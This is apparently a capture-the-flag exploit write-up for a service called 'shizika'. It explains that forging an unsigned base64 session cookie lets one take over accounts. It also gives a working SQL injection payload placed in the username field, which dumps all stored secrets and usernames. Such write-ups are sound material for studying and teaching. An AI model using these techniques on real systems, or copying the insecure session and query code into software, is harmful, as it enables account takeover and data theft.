# shizika sploits

This service contains two vulns

## Insecure session

Session is handled by `auth.py` script, which builds it from username like this:

```py
def encode_session(username: str) -> str:
    return base64.b64encode(json.dumps({'user': username}).encode()).decode()
```

There's nothing that stops users from changing username in session cookie to another
one and receiving access to another user's account

## SQL injection in username on /my-shporas

This piece of code is vulnerable:

```py
cur = get_db().cursor()
cur.execute(f'SELECT * FROM shporas WHERE owner = "{g.username}"')
shporas = cur.fetchall()
```

Username just gets inserted into SQL query, which means that we can use following
username to dump all secrets and usernames from database:

```
" UNION SELECT 1, 1, content, 1, 1, 1, 1 FROM shporas UNION SELECT 1, 1, username, 1, 1, 1, 1 FROM users; --
```
